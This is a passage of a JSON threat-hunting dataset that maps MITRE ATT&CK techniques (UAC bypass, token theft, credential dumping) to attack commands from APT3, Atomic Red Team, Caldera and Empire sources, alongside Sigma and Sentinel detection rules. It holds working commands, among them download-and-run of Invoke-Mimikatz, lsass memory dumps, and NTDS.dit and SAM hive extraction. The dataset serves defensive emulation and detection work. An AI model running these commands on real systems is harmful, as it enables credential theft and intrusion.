"\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "\\Software\\Classes\\ms-settings\\shell\\open\\command", "\\Software\\Classes\\ms-settings\\shell\\open\\command", "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe", "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe", "powershell/privesc/ask", "powershell/privesc/ask", "powershell/privesc/bypassuac", "powershell/privesc/bypassuac", "powershell/privesc/bypassuac_eventvwr", "powershell/privesc/bypassuac_eventvwr", "powershell/privesc/bypassuac_wscript", "powershell/privesc/bypassuac_wscript", "powershell/privesc/bypassuac_env", "powershell/privesc/bypassuac_env", "powershell/privesc/bypassuac_fodhelper", "powershell/privesc/bypassuac_fodhelper", "powershell/privesc/bypassuac_sdctlbypass", "powershell/privesc/bypassuac_sdctlbypass", "powershell/privesc/bypassuac_tokenmanipulation", "powershell/privesc/bypassuac_tokenmanipulation"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_parent_command_line contains \"eventvwr.exe\"or process_parent_command_line contains \"fodhelper.exe\"or process_path contains \"ShellRunas.exe\")", "name": "Bypass User Account Control Process"}, {"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"*\\\\mscfile\\\\shell\\\\open\\\\command\\\\*\"or registry_key_path contains \"*\\\\ms-settings\\\\shell\\\\open\\\\command\\\\*\")", "name": "Bypass User Account Control Registry"}], "possible_detections": [{"data_source": {"title": "UAC Bypass via Event Viewer", "id": "7c81fec3-1c1d-43b0-996a-46753041b1b6", "status": "experimental", "description": "Detects UAC bypass method using Windows event viewer", "references": ["https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/", "https://www.hybrid-analysis.com/sample/e122bc8bf291f15cab182a5d2d27b8db1e7019e4e96bb5cdbd1dfe7446f3f51f?environmentId=100"], "author": "Florian Roth", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"methregistry": {"EventID": 13, "TargetObject": "HKEY_USERS\\\\*\\mscfile\\shell\\open\\command"}, "methprocess": {"EventID": 1, "ParentImage": "*\\eventvwr.exe"}, "filterprocess": {"Image": "*\\mmc.exe"}, "condition": "methregistry or ( methprocess and not filterprocess )"}, "fields": ["CommandLine", "ParentCommandLine"], "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1088", "car.2019-04-001"], "falsepositives": ["unknown"], "level": "critical"}}, {"data_source": {"title": "UAC Bypass via sdclt", "id": "5b872a46-3b90-45c1-8419-f675db8053aa", "status": "experimental", "description": "Detects changes to HKCU:\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "references": ["https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/"], "author": "Omer Yampel", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 13, "TargetObject": "HKEY_USERS\\\\*\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand"}, "condition": "selection"}, "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1088", "car.2019-04-001"], "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "Empire PowerShell UAC Bypass", "id": "3268b746-88d8-4cd3-bffc-30077d02c787", "status": "experimental", "description": "Detects some Empire PowerShell UAC bypass methods", "references": ["https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64", "https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-FodHelperBypass.ps1#L64"], "author": "Ecco", "date": "2019/08/30", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["* -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update)*", "* -NoP -NonI -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update);*"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1088", "car.2019-04-001"], "falsepositives": ["unknown"], "level": "critical"}}]}, {"technique_id": "Credentials:", "commands": [], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "Credentials:", "Built-in Windows Command": "", "Cobalt Strike": "", "Metasploit": "", "Description": ""}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1134", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Token Stealing:\nsteal_token pid#", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Token Stealing:\nuse incognito\nlist_tokens -u\nimpersonate_token DOMAIN\\\\User\nor:\nsteal_token {pid}", "name": "Metasploit"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/tokens", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/tokens", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/runas", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/runas", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/getsystem", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/getsystem", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1134", "Built-in Windows Command": "", "Cobalt Strike": "Token Stealing:\nsteal_token pid#", "Metasploit": "Token Stealing:\nuse incognito\nlist_tokens -u\nimpersonate_token DOMAIN\\\\User\nor:\nsteal_token {pid}", "Description": "This steals the access token from another process and uses it to gain access to other services or computers. In Cobalt Strike, this token is only used when accessing remote systems, but in Meterpreter, this token is used for everything until it's dropped via rev2self. You need to be in a high integrity process for this to work."}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/tokens", "ATT&CK Technique #1": "T1134", "ATT&CK Technique #2": "", "Technique": "Access Token Manipulation", "Concatenate for Python Dictionary": "\"powershell/credentials/tokens\":  [\"T1134\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/runas", "ATT&CK Technique #1": "T1134", "ATT&CK Technique #2": "", "Technique": "Access Token Manipulation", "Concatenate for Python Dictionary": "\"powershell/management/runas\":  [\"T1134\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/getsystem", "ATT&CK Technique #1": "T1134", "ATT&CK Technique #2": "", "Technique": "Access Token Manipulation", "Concatenate for Python Dictionary": "\"powershell/privesc/getsystem\":  [\"T1134\"],"}}], "command_list": ["Token Stealing:\nsteal_token pid#", "Token Stealing:\nuse incognito\nlist_tokens -u\nimpersonate_token DOMAIN\\\\User\nor:\nsteal_token {pid}", "powershell/credentials/tokens", "powershell/credentials/tokens", "powershell/management/runas", "powershell/management/runas", "powershell/privesc/getsystem", "powershell/privesc/getsystem"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1003", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "hashdump\nmimikatz !lsadump::sam", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "hashdump\nrun hashdump\nrun smart_hashdump\npost/windows/gather/credentials/domain_hashdump", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "logonpasswords\nmimikatz !sekurlsa::logonpasswords\nmimikatz !sekurlsa::msv\nmimikatz !sekurlsa::kerberos\nmimikatz !sekurlsa::wdigest", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "use mimikatz\nwdigest\nmsv\nkerberos\nlogonpasswords", "name": "Metasploit"}, {"source": "atomics/T1003/T1003.yaml", "command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe -a\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{gsecdump_exe} -a\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{gsecdump_exe} -a\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{wce_exe} -o %temp%\\wce-output.txt\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "PathToAtomicsFolder\\T1003\\bin\\wce.exe -o #{output_file}\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{wce_exe} -o #{output_file}\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{wce_exe} -o #{output_file}\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{procdump_exe} -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "PathToAtomicsFolder\\T1003\\bin\\procdump.exe -accepteula -ma lsass.exe #{output_file}\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "PathToAtomicsFolder\\T1003\\bin\\Outflank-Dumpert.exe\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "#{mimikatz_exe} \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\" q q\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "vssadmin.exe create shadow /for=C:\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": ". PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1\nGet-GPPPassword -Verbose\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": ". #{gpp_script_path}\nGet-GPPPassword -Verbose\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "pypykatz live lsa\n", "name": null}, {"source": "atomics/T1003/T1003.yaml", "command": "pypykatz live registry\n", "name": null}, {"source": "data/abilities/credential-access/0360ede1-3c28-48d3-a6ef-6e98f562c5af.yml", "command": {"windows": {"psh": {"command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n", "payloads": ["powerview.ps1"]}}}, "name": "Get a list of all computers in a domain"}, {"source": "data/abilities/credential-access/0ef4cc7b-611c-4237-b20b-db36b6906554.yml", "command": {"windows": {"psh": {"command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n"}}}, "name": "Dump lsass for later use with mimikatz"}, {"source": "data/abilities/credential-access/3c647015-ab0a-496a-8847-6ab173cd2b22.yml", "command": {"windows": {"psh": {"command": ".\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n", "payloads": ["totallylegit.exe"]}}}, "name": "Custom GO credential dumper using minidumpwritedump"}, {"source": "data/abilities/credential-access/7049e3ec-b822-4fdf-a4ac-18190f9b66d1.yml", "command": {"windows": {"psh": {"command": "Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n", "parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}, {"source": "domain.user.name", "edge": "has_hash", "target": "domain.user.ntlm"}, {"source": "domain.user.name", "edge": "has_hash", "target": "domain.user.sha1"}]}, "payloads": ["invoke-mimi.ps1"]}}}, "name": "Use Invoke-Mimikatz"}, {"source": "data/abilities/credential-access/98e58fc4-3843-4511-89b1-50cb872e0c9b.yml", "command": {"windows": {"psh": {"command": "reg query HKLM /f password /t REG_SZ /s\n"}}}, "name": "Search for possible credentials stored in the HKLM Hive"}, {"source": "data/abilities/credential-access/baac2c6d-4652-4b7e-ab0a-f1bf246edd12.yml", "command": {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds\n", "parsers": {"plugins.stockpile.app.parsers.katz": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}}}}, "name": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords"}, {"source": "Threat Hunting Tables", "command": "ntdsutil.exe", "name": "parent_process"}, {"source": "SysmonHunter - Credential Dumping", "command": "HKLM\\SAM|HKLM\\Security\\\\Windows\\\\.+\\\\lsass.exe", "name": null}, {"source": "SysmonHunter - Credential Dumping", "command": "\\\\Windows\\\\.+\\\\bcryptprimitives.dll|\\\\Windows\\\\.+\\\\bcrypt.dll|\\\\Windows\\\\.+\\\\ncrypt.dll", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/ChromeDump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/ChromeDump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/FoxDump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/FoxDump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/ninjacopy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/ninjacopy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/add_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/add_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/find_keepass_config", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/find_keepass_config", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/get_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/get_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/keethief", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/keethief", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/remove_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/vaults/remove_keepass_config_trigger", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/enum_cred_store", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/enum_cred_store", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/cache", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/cache", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/command", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/command", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/dcsync", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/dcsync", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/dcsync_hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/dcsync_hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/extract_tickets", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/extract_tickets", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/golden_ticket", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/golden_ticket", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/logonpasswords", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/logonpasswords", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/lsadump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/lsadump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/mimitokens", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/mimitokens", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/sam", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/sam", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/silver_ticket", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/silver_ticket", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/trust_keys", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/trust_keys", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/powerdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/powerdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/vault_credential", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/vault_credential", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/downgrade_account", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/downgrade_account", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/wdigest_downgrade", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/wdigest_downgrade", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/gpp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/gpp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/mcafee_sitelist", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/mcafee_sitelist", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/mimipenguin", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/mimipenguin", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/hashdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/kerberosdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/kerberosdump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/kerberos_inject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/kerberos_inject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/etcd_crawler", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/etcd_crawler", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / start\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\n[*] Signal sent to start the VSS service.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / create c\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\n[*] Attempting to create a shadow copy.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / list\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.\n\nSHADOW COPIES\n=============\n\n[*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}\n[*] Client accessible: True\n[*] Count: 1\n[*] Device object:? \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1\n[*] Differential: True\n[*] Exposed locally: False\n[*] Exposed name:\n[*] Exposed remotely: False\n[*] Hardware assisted: False\n[*] Imported: False\n[*] No auto release: True\n[*] Not surfaced: False\n[*] No writers: True\n[*] Originating machine: ICBC.abcc.org\n[*] Persistent: True\n[*] Plex: False\n[*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5}\n[*] Service machine: ICBC.abcc.org\n[*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53}\n[*] State: 12\n[*] Transportable: False\n[*] Volume name:? \\\\ \\ Volume {16da2094-7213-420f-a023-db7b3e3a7f6f} \\\n\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> copy \\\\ \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ windows \\ ntds \\ ntds.dit C:? \\\nWe have copied a file.\n\nC: \\ Users \\ Administrator \\ Desktop \\ test> cscript vssown.vbs / delete\nMicrosoft (R) Windows Script Host Version 5.812\nCopyright (C) Microsoft Corporation. all rights reserved.", "name": "Dos"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1003", "Built-in Windows Command": "", "Cobalt Strike": "hashdump\nmimikatz !lsadump::sam", "Metasploit": "hashdump\nrun hashdump\nrun smart_hashdump\npost/windows/gather/credentials/domain_hashdump", "Description": "Dumps hashes from the SAM Hive file."}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1003", "Built-in Windows Command": "", "Cobalt Strike": "logonpasswords\nmimikatz !sekurlsa::logonpasswords\nmimikatz !sekurlsa::msv\nmimikatz !sekurlsa::kerberos\nmimikatz !sekurlsa::wdigest", "Metasploit": "use mimikatz\nwdigest\nmsv\nkerberos\nlogonpasswords", "Description": "This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. \nThe Mimikatz project has a lot of different capabilities (https://github.com/gentilkiwi/mimikatz/wiki) such as pass-the-hash, pass-the-ticket, creating silver/golden tickets, dumping credentials, and elevating a process."}}, {"Atomic Red Team Test - Credential Dumping": {"attack_technique": "T1003", "display_name": "Credential Dumping", "atomic_tests": [{"name": "Powershell Mimikatz", "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\n\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\n\nCommon 